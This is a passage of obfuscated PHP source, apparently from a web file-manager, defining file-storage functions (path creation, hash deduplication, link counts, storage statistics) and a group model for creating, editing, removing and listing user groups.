(!IO::exist($ÜâÆ÷Ö¥ . $öÀÃ›ìÅ[777])) { IO::mkfile($ÜâÆ÷Ö¥ . $öÀÃ›ìÅ[777]); } Cache::set($ß˜ê¿∫á, 1, 3600 * 2); } return $∑—‰—Ò ; } public function makeFilePath($Ô‰—Ú—ö, $‘˛©ú±ò, $êèäøãÓ = false, $’±“¥÷ˆ = false) { $®áÚÈà =& $_SERVER[ëæªã÷]; $»Ò∞®˚É = Model($®áÚÈà[750])->get($®áÚÈà[1848]); $Û©ÕûÉÀ = KodIO::defaultIO() . date($®áÚÈà[1849]); $¿¡»ñ¿” = $Û©ÕûÉÀ . rand_string(5) . short_id(100); $Ô‰—Ú—ö = str_replace($®áÚÈà[8], $®áÚÈà[11], KodIO::clear($Ô‰—Ú—ö)); $ãõñƒé— = $‘˛©ú±ò->ext($Ô‰—Ú—ö); if (!$Ô‰—Ú—ö) { $»Ò∞®˚É = $®áÚÈà[1850]; } switch ($»Ò∞®˚É) { case $®áÚÈà[1851]: $¿¡»ñ¿” = $¿¡»ñ¿” . $®áÚÈà[10] . $‘˛©ú±ò->ext($Ô‰—Ú—ö); if ($ãõñƒé— == $®áÚÈà[1789]) { $¿¡»ñ¿” .= $®áÚÈà[1524]; } break; case $®áÚÈà[1852]: $åó‚⁄∑ = Model($®áÚÈà[750])->get($®áÚÈà[751]); $»ôÙÖ¢Ω = substr(md5($®áÚÈà[752] . $åó‚⁄∑ . date($®áÚÈà[728])), 0, 8); $…∫ÊÌ‡¸ = KodIO::defaultDriver(); $Û©ÕûÉÀ = $®áÚÈà[1203] . $…∫ÊÌ‡¸[$®áÚÈà[401]] . $®áÚÈà[410] . date($®áÚÈà[1853]) . $»ôÙÖ¢Ω . $®áÚÈà[8]; if ($ãõñƒé— == $®áÚÈà[1789]) { $Ô‰—Ú—ö .= $®áÚÈà[1524]; } $ë—éîïØ = $®áÚÈà[1854] . $Û©ÕûÉÀ . $Ô‰—Ú—ö; CacheLock::lock($ë—éîïØ); $¿¡»ñ¿” = $Û©ÕûÉÀ . $Ô‰—Ú—ö; if (IO::exist($Û©ÕûÉÀ . $Ô‰—Ú—ö)) { $Ó”›°Ø“ = substr($Ô‰—Ú—ö, 0, strlen($Ô‰—Ú—ö) - strlen($ãõñƒé—)); $µíœÖ¶≠ = $’±“¥÷ˆ ? substr($’±“¥÷ˆ, 0, 5) : ($êèäøãÓ ? substr($êèäøãÓ, 0, 5) : rand_string(5)); $¿¡»ñ¿” = $Û©ÕûÉÀ . $Ó”›°Ø“ . $µíœÖ¶≠ . $®áÚÈà[10] . $ãõñƒé—; } if (IO::isTypeObject($¿¡»ñ¿”) && !IO::isUploadServer($¿¡»ñ¿”)) { if (IO::exist($¿¡»ñ¿”)) { return $¿¡»ñ¿”; } $éÍ√ü˝¿ = IO::setContent($¿¡»ñ¿”, $®áÚÈà[12]); if (!$éÍ√ü˝¿) { show_json($®áÚÈà[1855], !1); } } CacheLock::unlock($ë—éîïØ); break; case $®áÚÈà[1850]: break; default: break; } return $¿¡»ñ¿”; } public function addFileByRemote($„®Ã≠ˆó, $É◊÷¶≤Ä, $ê∆À∫Ü  = array()) { $πŒøò‚Ã =& $_SERVER[ëæªã÷]; if (!IO::exist($„®Ã≠ˆó)) { return !1; } $ñê™©á® = $ê∆À∫Ü [$πŒøò‚Ã[179]] ? $ê∆À∫Ü [$πŒøò‚Ã[179]] : $πŒøò‚Ã[12]; $Ûùöéê« = IO::hashMd5($„®Ã≠ˆó, $ñê™©á®); $’´»œÈá = KodIO::defaultDriver(); $Ò‰Ì‚Å¯ = array($πŒøò‚Ã[579] => IO::size($„®Ã≠ˆó), $πŒøò‚Ã[1856] => 1, $πŒøò‚Ã[421] => $É◊÷¶≤Ä, $πŒøò‚Ã[788] => $’´»œÈá[$πŒøò‚Ã[401]], $πŒøò‚Ã[422] => $„®Ã≠ˆó, $πŒøò‚Ã[1857] => $ê∆À∫Ü [$πŒøò‚Ã[180]] ? $ê∆À∫Ü [$πŒøò‚Ã[180]] : IO::hashSimple($„®Ã≠ˆó), $πŒøò‚Ã[1858] => $Ûùöéê« ? $Ûùöéê« : $ñê™©á®); if ($Ωö∑¡àÄ = $this->addFileCheckExist($Ò‰Ì‚Å¯[$πŒøò‚Ã[180]], $Ò‰Ì‚Å¯[$πŒøò‚Ã[179]], $Ò‰Ì‚Å¯[$πŒøò‚Ã[90]])) { return $Ωö∑¡àÄ; } return $this->addFileData($Ò‰Ì‚Å¯); } private function addFileData($¸áÅ¿≥∑) { $º˛º˛µ˛ =& $_SERVER[ëæªã÷]; if (!$¸áÅ¿≥∑) { return !1; } $¸áÅ¿≥∑[$º˛º˛µ˛[90]] = intval($¸áÅ¿≥∑[$º˛º˛µ˛[90]]); if (!$¸áÅ¿≥∑[$º˛º˛µ˛[90]] && strlen($¸áÅ¿≥∑[$º˛º˛µ˛[180]]) > 32) { $¸áÅ¿≥∑[$º˛º˛µ˛[90]] = intval(substr($¸áÅ¿≥∑[$º˛º˛µ˛[180]], 32)); } $›õ†û“˜ = $this->add($¸áÅ¿≥∑); return $this->find($›õ†û“˜); } public function addFile($ŸÀˆç–Ã, $ì°–…Í—, $åΩ⁄∞•ä = false) { $á——ÿìÇ =& $_SERVER[ëæªã÷]; $ﬂ›´âÇØ = IO::hashSimple($ŸÀˆç–Ã); $®Üﬂõ¢´ = IO::size($ŸÀˆç–Ã); $÷Ûæ¥çæ = $®Üﬂõ¢´ <= 1024 * 1024 * 10 ? IO::hashMd5($ŸÀˆç–Ã) : $á——ÿìÇ[12]; $◊Ú˛∏»π = $á——ÿìÇ[1859] . $ﬂ›´âÇØ; CacheLock::lock($◊Ú˛∏»π); if ($÷Ûæ¥çæ && $ﬂ›´âÇØ) { $ò¯Æ¥⁄™ = $this->addFileCheckExist($ﬂ›´âÇØ, $÷Ûæ¥çæ, $®Üﬂõ¢´); if ($ò¯Æ¥⁄™) { CacheLock::unlock($◊Ú˛∏»π); return $ò¯Æ¥⁄™; } } $‡µÃôËÑ = $this->addFileMake($ŸÀˆç–Ã, $®Üﬂõ¢´, $ﬂ›´âÇØ, $÷Ûæ¥çæ, $ì°–…Í—, $åΩ⁄∞•ä); $Œ˘©¸·” = $this->addFileData($‡µÃôËÑ); CacheLock::unlock($◊Ú˛∏»π); if (!$÷Ûæ¥çæ && $Œ˘©¸·”) { $this->fileMd5Check($Œ˘©¸·”); } return $Œ˘©¸·”; } private function fileMd5Check($‰›Ωç®Ö) { $«¢ßÌˆè =& $_SERVER[ëæªã÷]; $à Éµ⁄√ = array($‰›Ωç®Ö[$«¢ßÌˆè[467]], $‰›Ωç®Ö[$«¢ßÌˆè[88]]); $◊Üé™‘∂ = $«¢ßÌˆè[1860] . $‰›Ωç®Ö[$«¢ßÌˆè[88]]; $Ù±ÑÒπó = $«¢ßÌˆè[1861] . $‰›Ωç®Ö[$«¢ßÌˆè[467]]; $ï∫äàÈ® = TaskQueue::add($«¢ßÌˆè[1862], $à Éµ⁄√, $◊Üé™‘∂, $Ù±ÑÒπó); if (!$ï∫äàÈ®) { $this->fileMd5Set($‰›Ωç®Ö[$«¢ßÌˆè[467]], $‰›Ωç®Ö[$«¢ßÌˆè[88]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($÷ﬂëÎ◊Â, $ÛöÔ◊ªæ) { $øÚ¡¬’À =& $_SERVER[ëæªã÷]; $ıÚË¶ Ä = $this->find($÷ﬂëÎ◊Â); if (!$ıÚË¶ Ä || $ıÚË¶ Ä[$øÚ¡¬’À[179]]) { return; } $ã¸∑¨°ì = IO::hashMd5($ÛöÔ◊ªæ); if (!$ã¸∑¨°ì) { return $øÚ¡¬’À[12]; } $this->where(array($øÚ¡¬’À[467] => $÷ﬂëÎ◊Â))->save(array($øÚ¡¬’À[179] => $ã¸∑¨°ì)); } public function addFileMake($‰°¿Ã«ê, $£ôÖ¨˛‰, $åŸÜù’ì, $™›Ç—ÿ, $ù—‚çµ¸, $∂áæôæö) { $»ÙÔı˚Ü =& $_SERVER[ëæªã÷]; $∞Úà£ë˛ = $this->createFileName($ù—‚çµ¸, $åŸÜù’ì, $™›Ç—ÿ); $ÓÇæÇ‚˘ = get_path_father($∞Úà£ë˛); $Ê›„É˙¶ = get_path_this($∞Úà£ë˛); if ($∂áæôæö) { $íÚ˚≤ÌΩ = IO::move($‰°¿Ã«ê, $ÓÇæÇ‚˘, !1, $Ê›„É˙¶); } else { $íÚ˚≤ÌΩ = IO::copy($‰°¿Ã«ê, $ÓÇæÇ‚˘, !1, $Ê›„É˙¶); } if (!$íÚ˚≤ÌΩ) { return !1; } $ÅË™ô©™ = KodIO::defaultDriver(); $˜•ÊÇÔå = array($»ÙÔı˚Ü[579] => $£ôÖ¨˛‰, $»ÙÔı˚Ü[1856] => 1, $»ÙÔı˚Ü[421] => $ù—‚çµ¸, $»ÙÔı˚Ü[788] => $ÅË™ô©™[$»ÙÔı˚Ü[401]], $»ÙÔı˚Ü[422] => $∞Úà£ë˛, $»ÙÔı˚Ü[1857] => $åŸÜù’ì, $»ÙÔı˚Ü[1858] => $™›Ç—ÿ); return $˜•ÊÇÔå; } public function addFileCheckExist($Ü¿ËúŸ¡, $ÔäÿÄî, $î≈›Æã˝) { $≤ä◊ûÇ¿ =& $_SERVER[ëæªã÷]; $ü¯…íﬂ´ = $this->findByHash($Ü¿ËúŸ¡, $ÔäÿÄî); if (!$ü¯…íﬂ´) { return !1; } $∂»ÊæÛ¿ = array($≤ä◊ûÇ¿[1856] => intval($ü¯…íﬂ´[$≤ä◊ûÇ¿[1863]]) + 1, $≤ä◊ûÇ¿[579] => $î≈›Æã˝); $this->where(array($≤ä◊ûÇ¿[468] => $ü¯…íﬂ´[$≤ä◊ûÇ¿[467]]))->save($∂»ÊæÛ¿); return $ü¯…íﬂ´; } public function remove($üØ∂∏Óî) { $this->linkCountChange($üØ∂∏Óî, !1); $this->clearEmpty(); return !0; } public function linkAdd($ﬂÛ˛ÎÏﬁ) { $this->linkCountChange($ﬂÛ˛ÎÏﬁ, !0); } public function linkCountChange($ë∑Ñ‚å„, $û¬ö¥ò‚) { $ı∆‹Ö›ï =& $_SERVER[ëæªã÷]; if (!$ë∑Ñ‚å„) { return; } if (!is_array($ë∑Ñ‚å„)) { $ë∑Ñ‚å„ = array($ë∑Ñ‚å„); } $∑úÊØ±Æ = array(); foreach ($ë∑Ñ‚å„ as $¥æ©˘È•) { $ç‘˛óÏü = $¥æ©˘È• . $ı∆‹Ö›ï[12]; if (!$∑úÊØ±Æ[$ç‘˛óÏü]) { $∑úÊØ±Æ[$ç‘˛óÏü] = 0; } $∑úÊØ±Æ[$ç‘˛óÏü]++; } $◊÷§Êµ¯ = array(); foreach ($∑úÊØ±Æ as $¥æ©˘È• => $˘ø©—ç) { $ç‘˛óÏü = $˘ø©—ç . $ı∆‹Ö›ï[12]; if (!$◊÷§Êµ¯[$ç‘˛óÏü]) { $◊÷§Êµ¯[$ç‘˛óÏü] = array(); } $◊÷§Êµ¯[$ç‘˛óÏü][] = $¥æ©˘È•; } foreach ($◊÷§Êµ¯ as $˘ø©—ç => $ˆ˙˝Û·Ó) { if (!$ˆ˙˝Û·Ó) { continue; } $˘ø©—ç = $û¬ö¥ò‚ ? $˘ø©—ç : -intval($˘ø©—ç); $∏¥ﬂ„¬Ó = array($ı∆‹Ö›ï[467] => array($ı∆‹Ö›ï[7], $ˆ˙˝Û·Ó)); if ($˘ø©—ç < 0) { $∏¥ﬂ„¬Ó[$ı∆‹Ö›ï[1863]] = array($ı∆‹Ö›ï[991], abs($˘ø©—ç)); } $this->where($∏¥ﬂ„¬Ó)->setAdd($ı∆‹Ö›ï[1863], $˘ø©—ç); } } public function findByHash($úØ∫“îœ, $¢µ≠ó˝ò = false) { $©¥Õ£≥∂ =& $_SERVER[ëæªã÷]; if (!$úØ∫“îœ && !$¢µ≠ó˝ò) { return !1; } $≠˜Ù®î¨ = array($©¥Õ£≥∂[1857] => $úØ∫“îœ); if ($¢µ≠ó˝ò) { $≠˜Ù®î¨ = array($©¥Õ£≥∂[1858] => $¢µ≠ó˝ò); } return $this->order($©¥Õ£≥∂[1864])->where($≠˜Ù®î¨)->find(); } public function clearEmpty($ÙãÛâƒ§ = 0) { $¨ÓœºôØ =& $_SERVER[ëæªã÷]; $Æúù∑àô = time() - 3600 * 24 * $ÙãÛâƒ§; $æ¶°“Äû = $¨ÓœºôØ[1865] . $Æúù∑àô; $ãŸù˘¢– = $this->where($æ¶°“Äû)->select(); if (!$ãŸù˘¢–) { return; } $¿ÏÏ√™® = new Task($¨ÓœºôØ[1866], $¨ÓœºôØ[12], count($ãŸù˘¢–)); foreach ($ãŸù˘¢– as $≥ñ≤ﬁéâ) { $¿ÏÏ√™®->update(1); $this->resetFile($≥ñ≤ﬁéâ); } $¿ÏÏ√™®->end(); } public function resetFile($ºñüÅºÅ) { $Ëπï∑‚√ =& $_SERVER[ëæªã÷]; $äÍß≠¸Ô = array($Ëπï∑‚√[468] => $ºñüÅºÅ[$Ëπï∑‚√[467]]); $ú«¸…÷È = Model($Ëπï∑‚√[1301])->where($äÍß≠¸Ô)->count(); $‡ûàÀ∞± = Model($Ëπï∑‚√[1867])->where($äÍß≠¸Ô)->count(); $Ø í¥Ü‹ = intval($ú«¸…÷È) + intval($‡ûàÀ∞±); if ($Ø í¥Ü‹ == 0) { IO::remove($ºñüÅºÅ[$Ëπï∑‚√[88]]); Model($Ëπï∑‚√[1868])->delete($ºñüÅºÅ[$Ëπï∑‚√[467]]); $this->where($äÍß≠¸Ô)->delete(); $this->metaSet($ºñüÅºÅ[$Ëπï∑‚√[467]], null, null); return; } if ($ºñüÅºÅ[$Ëπï∑‚√[1863]] != $Ø í¥Ü‹) { $this->where($äÍß≠¸Ô)->save(array($Ëπï∑‚√[1856] => $Ø í¥Ü‹)); } } public function storageInfo($ì”öƒøÛ = false) { $»‚ÊÊ†™ =& $_SERVER[ëæªã÷]; $¸±‚“ç“ = $this->count() + 0.0; $®◊ô‡©⁄ = 0; $«‰â”Ÿî = 1; $≠æÍ˘üà = 0; $ÂÄ©≠‰œ = 5000; for ($ñ™⁄‰—´ = 0; $ñ™⁄‰—´ < $¸±‚“ç“; $ñ™⁄‰—´ = $ñ™⁄‰—´ + $ÂÄ©≠‰œ) { $ƒ±÷Û…Ì = $this->limit($ñ™⁄‰—´, $ñ™⁄‰—´ + $ÂÄ©≠‰œ)->select(); foreach ($ƒ±÷Û…Ì as $ãë∑‰≥Ó) { $«‰â”Ÿî += $ãë∑‰≥Ó[$»‚ÊÊ†™[90]] * $ãë∑‰≥Ó[$»‚ÊÊ†™[1863]]; $®◊ô‡©⁄ += $ãë∑‰≥Ó[$»‚ÊÊ†™[90]] * ($ãë∑‰≥Ó[$»‚ÊÊ†™[1863]] - 1); $≠æÍ˘üà += $ãë∑‰≥Ó[$»‚ÊÊ†™[1863]]; } } $ﬁ∞ÚÙ—√ = array($»‚ÊÊ†™[1869] => $«‰â”Ÿî, $»‚ÊÊ†™[1870] => $®◊ô‡©⁄, $»‚ÊÊ†™[1871] => $®◊ô‡©⁄ / $«‰â”Ÿî, $»‚ÊÊ†™[94] => $¸±‚“ç“, $»‚ÊÊ†™[1872] => $≠æÍ˘üà); return $ﬁ∞ÚÙ—√; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\x70"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\x6d\x65" => "\x67\x72\157\165\160\137\155\x65\164\x61", "\155\145\x74\141\x46\x69\145\154\x64" => "\x67\162\x6f\x75\x70\x49\104"); protected function cacheFunctionAlias($·Ü⁄∂’µ) { $èª éßî =& $_SERVER[ëæªã÷]; return array($èª éßî[1873] => array($·Ü⁄∂’µ[0], $èª éßî[1874]), $èª éßî[1875] => array($·Ü⁄∂’µ[0], $èª éßî[1876])); } protected function getInfo($πÚ’Úæ∆, $π€ò¯†Ü = false) { $é›™˙∆¥ = $this->getInfoSimple($πÚ’Úæ∆); if (!$é›™˙∆¥) { return !1; } if ($π€ò¯†Ü) { return $this->_listDataApplyItem($é›™˙∆¥); } return $this->cacheFunctionGet($_SERVER[ëæªã÷][1877], $πÚ’Úæ∆); } protected function getInfoSimple($û†≥“—º, $∞Ö‰Òﬂ” = false) { $ØÎó¬®é =& $_SERVER[ëæªã÷]; if ($∞Ö‰Òﬂ”) { $¡ìçŒ§» = array($ØÎó¬®é[1796] => intval($û†≥“—º)); $Ø¿¿®‰è = $this->where($¡ìçŒ§»)->find(); return is_array($Ø¿¿®‰è) ? $Ø¿¿®‰è : array(); } return $this->cacheFunctionGet($ØÎó¬®é[1878], $û†≥“—º); } protected function groupAdd($È°Ø»™¸) { $ƒÎû¿‰† =& $_SERVER[ëæªã÷]; if (!$È°Ø»™¸[$ƒÎû¿‰†[498]] && isset($È°Ø»™¸[$ƒÎû¿‰†[1796]]) && $È°Ø»™¸[$ƒÎû¿‰†[1796]] == 1) { if ($ë»ﬂŒ∫ù = $this->getInfoSimple($È°Ø»™¸[$ƒÎû¿‰†[1796]], !0)) { return $È°Ø»™¸[$ƒÎû¿‰†[1796]]; } } else { $ë»ﬂŒ∫ù = $this->getInfoSimple($È°Ø»™¸[$ƒÎû¿‰†[498]]); if (!$ë»ﬂŒ∫ù) { return !1; } } $π◊–∆·æ = $ƒÎû¿‰†[531]; if ($ë»ﬂŒ∫ù[$ƒÎû¿‰†[521]]) { $π◊–∆·æ = $ë»ﬂŒ∫ù[$ƒÎû¿‰†[521]] . $ë»ﬂŒ∫ù[$ƒÎû¿‰†[1796]] . $ƒÎû¿‰†[50]; } $õ…‹é¥« = array($ƒÎû¿‰†[421] => $this->groupNameAuto($È°Ø»™¸[$ƒÎû¿‰†[498]], $È°Ø»™¸[$ƒÎû¿‰†[32]]), $ƒÎû¿‰†[402] => $È°Ø»™¸[$ƒÎû¿‰†[498]], $ƒÎû¿‰†[584] => $π◊–∆·æ, $ƒÎû¿‰†[1879] => $È°Ø»™¸[$ƒÎû¿‰†[1783]], $ƒÎû¿‰†[1880] => 0, $ƒÎû¿‰†[1800] => 0); if (isset($È°Ø»™¸[$ƒÎû¿‰†[1819]])) { $õ…‹é¥«[$ƒÎû¿‰†[1819]] = $È°Ø»™¸[$ƒÎû¿‰†[1819]]; } else { $§´ò“ÄÊ = $this->max($ƒÎû¿‰†[1819]); if (!$§´ò“ÄÊ) { $§´ò“ÄÊ = 0; } $õ…‹é¥«[$ƒÎû¿‰†[1819]] = $§´ò“ÄÊ + 1; } if (!empty($È°Ø»™¸[$ƒÎû¿‰†[1796]])) { $õ…‹é¥«[$ƒÎû¿‰†[1796]] = $È°Ø»™¸[$ƒÎû¿‰†[1796]]; } $´ƒ“êê¿ = $this->add($õ…‹é¥«); $this->setNamePinyin($´ƒ“êê¿, $õ…‹é¥«[$ƒÎû¿‰†[32]]); if (isset($È°Ø»™¸[$ƒÎû¿‰†[1881]])) { $this->metaSet($´ƒ“êê¿, array($ƒÎû¿‰†[1881] => $È°Ø»™¸[$ƒÎû¿‰†[1881]], $ƒÎû¿‰†[1882] => $È°Ø»™¸[$ƒÎû¿‰†[1882]])); unset($È°Ø»™¸[$ƒÎû¿‰†[1881]]); unset($È°Ø»™¸[$ƒÎû¿‰†[1882]]); } Model($ƒÎû¿‰†[1301])->groupRootAdd($´ƒ“êê¿); return $´ƒ“êê¿; } protected function groupEdit($Û‹ø‰îã, $√¿Ï≠úπ) { $∞∞ÀÌﬁ— =& $_SERVER[ëæªã÷]; $àÑË•∑  = $this->getInfoSimple($Û‹ø‰îã); if (!$àÑË•∑ ) { return !1; } if (!empty($√¿Ï≠úπ[$∞∞ÀÌﬁ—[498]])) { $ö€çæ∫Î = $this->getInfoSimple($√¿Ï≠úπ[$∞∞ÀÌﬁ—[498]]); if (!$ö€çæ∫Î) { return !1; } if ($àÑË•∑ [$∞∞ÀÌﬁ—[1796]] == $ö€çæ∫Î[$∞∞ÀÌﬁ—[1796]]) { return !1; } if ($√¿Ï≠úπ[$∞∞ÀÌﬁ—[498]] != $àÑË•∑ [$∞∞ÀÌﬁ—[498]]) { if ($ö€çæ∫Î[$∞∞ÀÌﬁ—[521]] !== $àÑË•∑ [$∞∞ÀÌﬁ—[521]] && strpos($ö€çæ∫Î[$∞∞ÀÌﬁ—[521]], $àÑË•∑ [$∞∞ÀÌﬁ—[521]] . $àÑË•∑ [$∞∞ÀÌﬁ—[1796]] . $∞∞ÀÌﬁ—[50]) === 0) { return !1; } $√¿Ï≠úπ[$∞∞ÀÌﬁ—[584]] = $ö€çæ∫Î[$∞∞ÀÌﬁ—[521]] . $√¿Ï≠úπ[$∞∞ÀÌﬁ—[498]] . $∞∞ÀÌﬁ—[50]; $this->_changeChildLevel($àÑË•∑ , $ö€çæ∫Î); } } if (isset($√¿Ï≠úπ[$∞∞ÀÌﬁ—[32]])) { $this->setNamePinyin($Û‹ø‰îã, $√¿Ï≠úπ[$∞∞ÀÌﬁ—[32]]); } if (isset($√¿Ï≠úπ[$∞∞ÀÌﬁ—[1881]])) { $this->metaSet($Û‹ø‰îã, array($∞∞ÀÌﬁ—[1881] => $√¿Ï≠úπ[$∞∞ÀÌﬁ—[1881]], $∞∞ÀÌﬁ—[1882] => $√¿Ï≠úπ[$∞∞ÀÌﬁ—[1882]])); unset($√¿Ï≠úπ[$∞∞ÀÌﬁ—[1881]]); unset($√¿Ï≠úπ[$∞∞ÀÌﬁ—[1882]]); } $this->_clearChildrenCache($àÑË•∑ ); return $this->where(array($∞∞ÀÌﬁ—[1883] => $Û‹ø‰îã))->save($√¿Ï≠úπ); } private function _clearChildrenCache($ë˜€ã”Í) { $†é‘œûı =& $_SERVER[ëæªã÷]; $Ø™˝Î∞Í = array($†é‘œûı[584] => array($†é‘œûı[544], $ë˜€ã”Í[$†é‘œûı[521]] . $ë˜€ã”Í[$†é‘œûı[1796]] . $†é‘œûı[545])); $Ò“»ì◊¸ = $this->field($†é‘œûı[1796])->where($Ø™˝Î∞Í)->select(); foreach ($Ò“»ì◊¸ as $®ü›⁄¸Ö) { $this->_clearCache($®ü›⁄¸Ö[$†é‘œûı[1796]]); } } private function _clearCache($÷¢æÙ¬) { $û’≈ˆü› =& $_SERVER[ëæªã÷]; $this->cacheFunctionClear($û’≈ˆü›[1877], $÷¢æÙ¬); $this->cacheFunctionClear($û’≈ˆü›[1878], $÷¢æÙ¬); } private function _changeChildLevel($ìΩê◊Ÿü, $È˚¿°¬°, $ÇØÁ˘‡¨ = false) { $÷Ãˆã…√ =& $_SERVER[ëæªã÷]; $◊£ﬂﬁ¥Á = $ìΩê◊Ÿü[$÷Ãˆã…√[521]] . $ìΩê◊Ÿü[$÷Ãˆã…√[1796]] . $÷Ãˆã…√[50]; $‹Ä’Ø£⁄ = $È˚¿°¬°[$÷Ãˆã…√[521]] . $È˚¿°¬°[$÷Ãˆã…√[1796]] . $÷Ãˆã…√[50] . $ìΩê◊Ÿü[$÷Ãˆã…√[1796]] . $÷Ãˆã…√[50]; if ($ÇØÁ˘‡¨) { $‹Ä’Ø£⁄ = $È˚¿°¬°[$÷Ãˆã…√[521]] . $È˚¿°¬°[$÷Ãˆã…√[1796]] . $÷Ãˆã…√[50]; } $è£⁄µ®⁄ = array($÷Ãˆã…√[584] => array($÷Ãˆã…√[544], $ìΩê◊Ÿü[$÷Ãˆã…√[521]] . $ìΩê◊Ÿü[$÷Ãˆã…√[1796]] . $÷Ãˆã…√[545])); $»”≤Û‡Ï = array($÷Ãˆã…√[584] => array($÷Ãˆã…√[593], "\x72\x65\x70\154\141\x63\145\50\160\x61\x72\x65\156\164\114\x65\166\x65\x6c\54\x27{$◊£ﬂﬁ¥Á}\47\x2c\x27{$‹Ä’Ø£⁄}\47\x29")); $this->_clearChildrenCache($ìΩê◊Ÿü); $this->where($è£⁄µ®⁄)->data($»”≤Û‡Ï)->save(); } public function setNamePinyin($È¯°Î¸¯, $ô£≤ÛΩô = false) { $í≠Ëó€¢ =& $_SERVER[ëæªã÷]; if (!$ô£≤ÛΩô) { $¡…ÿ“¢Å = $this->getInfoSimple($È¯°Î¸¯); $ô£≤ÛΩô = $¡…ÿ“¢Å[$í≠Ëó€¢[32]]; } if (!Input::check($ô£≤ÛΩô, $í≠Ëó€¢[587])) { $this->metaSet($È¯°Î¸¯, $í≠Ëó€¢[464], null); $this->metaSet($È¯°Î¸¯, $í≠Ëó€¢[463], null); return; } $€ÿØ∞ºË = array($í≠Ëó€¢[464] => str_replace($í≠Ëó€¢[53], $í≠Ëó€¢[12], Pinyin::get($ô£≤ÛΩô)), $í≠Ëó€¢[463] => Pinyin::get($ô£≤ÛΩô, $í≠Ëó€¢[588])); $this->metaSet($È¯°Î¸¯, $€ÿØ∞ºË); } protected function groupStatus($®Êª≥«Ó, $àßÏÓ√¢) { $ÑÿŸÕÎƒ =& $_SERVER[ëæªã÷]; $´àﬁ˜⁄– = $this->getInfoSimple($®Êª≥«Ó); if (!$´àﬁ˜⁄–) { return !1; } if ($àßÏÓ√¢ == $ÑÿŸÕÎƒ[99]) { $áˆ“ΩåÆ = $this->parentLevelArray($´àﬁ˜⁄–[$ÑÿŸÕÎƒ[521]]); } else { $ˆ§ ßÃÀ = array($ÑÿŸÕÎƒ[584] => array($ÑÿŸÕÎƒ[544], $´àﬁ˜⁄–[$ÑÿŸÕÎƒ[521]] . $´àﬁ˜⁄–[$ÑÿŸÕÎƒ[1796]] . $ÑÿŸÕÎƒ[545])); $áˆ“ΩåÆ = $this->where($ˆ§ ßÃÀ)->field($ÑÿŸÕÎƒ[1796])->select(); $áˆ“ΩåÆ = array_to_keyvalue($áˆ“ΩåÆ, $ÑÿŸÕÎƒ[12], $ÑÿŸÕÎƒ[1796]); } $áˆ“ΩåÆ[] = $´àﬁ˜⁄–[$ÑÿŸÕÎƒ[1796]]; $¨©π¢ÌÓ = array(); foreach ($áˆ“ΩåÆ as $®Êª≥«Ó) { $¨©π¢ÌÓ[] = array($ÑÿŸÕÎƒ[1796] => $®Êª≥«Ó, $ÑÿŸÕÎƒ[105] => $ÑÿŸÕÎƒ[730], $ÑÿŸÕÎƒ[378] => $àßÏÓ√¢); $this->_clearCache($®Êª≥«Ó); } return Model($ÑÿŸÕÎƒ[1884])->addAll($¨©π¢ÌÓ, array(), !0); } protected function groupRemove($ ≥æºÁó) { $ÂÚ••¨ï =& $_SERVER[ëæªã÷]; $˚“´Öøª = array($ÂÚ••¨ï[1796] => $ ≥æºÁó); $¯¥∂¡’á = $this->where($˚“´Öøª)->find(); if (!$¯¥∂¡’á || $¯¥∂¡’á[$ÂÚ••¨ï[498]] == 0) { return !1; } $¿ùƒôé≤ = $this->getInfoSimple($¯¥∂¡’á[$ÂÚ••¨ï[498]]); $this->_changeChildLevel($¯¥∂¡’á, $¿ùƒôé≤, !0); $this->where(array($ÂÚ••¨ï[498] => $ ≥æºÁó))->save(array($ÂÚ••¨ï[498] => $¯¥∂¡’á[$ÂÚ••¨ï[498]])); Model($ÂÚ••¨ï[1884])->where($˚“´Öøª)->delete(); Model($ÂÚ••¨ï[1885])->where($˚“´Öøª)->delete(); Model($ÂÚ••¨ï[805])->groupRootRemove($ ≥æºÁó); return $this->where($˚“´Öøª)->delete(); } protected function groupSort($à¢å≠æâ) { $ÿ‡òëÚÈ =& $_SERVER[ëæªã÷]; $¥ãﬁ∞∏ = array(); foreach ($à¢å≠æâ as $û‘ÏÖË≈ => $˛ùãﬂç) { $¥ãﬁ∞∏[] = array($ÿ‡òëÚÈ[1796], $˛ùãﬂç, $ÿ‡òëÚÈ[1819], $û‘ÏÖË≈ + 1); } $this->saveAll($¥ãﬁ∞∏); } public function listData() { $∆¨∆ÄÒŸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($∆¨∆ÄÒŸ[$_SERVER[ëæªã÷][373]]); return $∆¨∆ÄÒŸ; } private function _makeOrder($ﬂç∂Õ»º = '') { $«Ô¯Ã‘„ =& $_SERVER[ëæªã÷]; $ÁØ¨ç∫∂ = array($«Ô¯Ã‘„[1796], $«Ô¯Ã‘„[32], $«Ô¯Ã‘„[1785], $«Ô¯Ã‘„[203]); $◊†Ç‹å¨ = array($«Ô¯Ã‘„[448] => $«Ô¯Ã‘„[449], $«Ô¯Ã‘„[450] => $«Ô¯Ã‘„[451]); $£ÎﬂÏ≥Ë = Input::get($«Ô¯Ã‘„[455], $«Ô¯Ã‘„[7], $«Ô¯Ã‘„[1800], $ÁØ¨ç∫∂); $†≤˘˙éÑ = Input::get($«Ô¯Ã‘„[456], $«Ô¯Ã‘„[7], $«Ô¯Ã‘„[1886], array($«Ô¯Ã‘„[1886], $«Ô¯Ã‘„[450])); $†≤˘˙éÑ = $◊†Ç‹å¨[$†≤˘˙éÑ]; $ﬂç∂Õ»º = $ﬂç∂Õ»º . "{$£ÎﬂÏ≥Ë}\40{$†≤˘˙éÑ}\x2c\40\147\162\x6f\x75\x70\x49\104\x20\x61\x73\143"; return $this->order($ﬂç∂Õ»º); } public function listChild($ÔÈáäá÷) { $‚˛ôƒ⁄œ =& $_SERVER[ëæªã÷]; $˛é•®üì = $this->where(array($‚˛ôƒ⁄œ[498] => $ÔÈáäá÷))->_makeOrder()->selectPage(200); $this->_listDataApply($˛é•®üì[$‚˛ôƒ⁄œ[373]]); return $˛é•®üì; } public function listByID($Ñ¢Î∫öÌ) { $«√´Âå« =& $_SERVER[ëæªã÷]; if (!$Ñ¢Î∫öÌ) { return array(); } $¶…Û–ÿù = array($«√´Âå«[1796] => array($«√´Âå«[7], $Ñ¢Î∫öÌ)); $çØûÁÁí = $this->where($¶…Û–ÿù)->select(); $çØûÁÁí = array_sort_keep($çØûÁÁí, $«√´Âå«[1796], $Ñ¢Î∫öÌ); 